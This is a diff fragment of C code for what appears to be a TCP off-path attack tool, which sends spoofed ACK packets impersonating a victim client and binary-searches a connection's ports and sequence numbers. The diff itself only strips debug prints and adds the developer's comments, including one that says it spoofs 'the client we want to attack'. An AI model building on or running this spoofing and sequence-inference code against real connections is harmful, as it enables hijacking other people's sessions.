@@ -38,17 +38,15 @@ struct state state_finish(Session *ctx) {
 }
 
 
+//return the count of the incoming packets for 1 second meanwhile set the seq and ack number in ctx
 #define PROBE_BUFF_LEN 60
 unsigned count_acks_for_2secs(Session *ctx) {
 	
-	//here
-	printf("Enter count_ack_for_2_sec\n");
 	int response_count = 0;
 	int start = time(NULL);
 	while (time(NULL)-start <= 1) {
+	
 		//get the tcp header from the packet
-		
-		//here the process stuck
 		struct tcp_header *h = session_read_packet(ctx);
 		
 		if (h == NULL)
@@ -69,12 +67,10 @@ unsigned count_acks_for_2secs(Session *ctx) {
 
 		free(h);
 	}
-	//here
-	printf("Exit count_ack_for_2_sec\n");
 	return response_count;
 }
 
-
+//the synchronization mechanism is to set the timer, but here my confusion is (is this even working?)
 void  tsync_to_offset(long nsec_offset) {
 	struct timespec tsync;
 	uint64_t exp;
@@ -91,7 +87,7 @@ void  tsync_to_offset(long nsec_offset) {
 	close(timer_fd);
 }
 
-
+//this function send spoof packet from the source(the client we want to attack) to server
 void probe_ack_spoof(Session *ctx, unsigned probe_count, uint32_t sequence) {
 	char buffer[PROBE_BUFF_LEN];
 	struct ipv4_header *ip = (struct ipv4_header *) buffer;
@@ -118,6 +114,7 @@ void probe_ack_spoof(Session *ctx, unsigned probe_count, uint32_t sequence) {
 
 }
 
+//this packet send a packet from the attacker to the server, but set the seq = seq+1000, and suspend 1000 microsecond for each packet
 void probe_ack_burst(Session *ctx, unsigned probe_count) {
 	char buffer[PROBE_BUFF_LEN];
 	struct ipv4_header *ip = (struct ipv4_header *) buffer;
@@ -264,6 +261,7 @@ int probe_syn_ack_binary_search(Session *ctx, uint16_t left, uint16_t right) {
 	return left;
 }
 
+//what the fuck is this binary search?
 uint32_t probe_seq_binary_search(Session *ctx, uint32_t left, uint32_t right, uint32_t step) {
 	uint32_t base = left;
 	right = (right-left)/step;
@@ -331,6 +329,7 @@ printf("[ENTERING] state_sequence_bin_search\n");
 	printf("Sequence in targets window: %u\n", ctx->sequence_in_window);
 	return s;
 }
+
 
 struct state state_sequence_chunk_inference(Session *ctx) {
 printf("[ENTERING] state_sequence_chunk_inference\n");
